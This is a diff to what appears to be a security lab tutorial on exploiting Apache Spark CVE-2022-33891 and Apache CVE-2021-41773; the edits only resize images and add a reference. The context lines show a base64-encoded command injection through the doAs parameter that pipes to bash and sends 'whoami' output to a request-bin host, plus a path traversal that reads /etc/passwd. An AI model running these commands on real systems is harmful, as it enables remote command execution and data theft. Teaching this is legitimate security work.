@@ -212,7 +212,7 @@ import base64
 base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
 ```
 
-<img src="./assets/python_encode.png" width=700 height=50>
+<img src="./assets/python_encode.png" width=550 height=50>
 
 
 ```
@@ -221,7 +221,7 @@ curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 
 We can see that we have got two GET requests in our Request Bin logger. One of this contains the target username:
 
-<img src="./assets/username.png" width=800 height=400>
+<img src="./assets/username.png" width=850 height=400>
 
 ### CVE-2021-41773
 
@@ -244,5 +244,7 @@ curl http://<IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
 3. [How WSO2 CVE-2022-29464 works](https://github.com/tufanturhan/wso2-rce-cve-2022-29464)
 
 4. [Apache Spark CVE-2022-33891](https://securityonline.info/cve-2022-33891-apache-spark-shell-command-injection-vulnerability/)
+
+5. [Apache CVE-2021-41773](https://www.picussecurity.com/resource/blog/simulate-apache-cve-2021-41773-exploits-vulnerability)
 
 # Activities
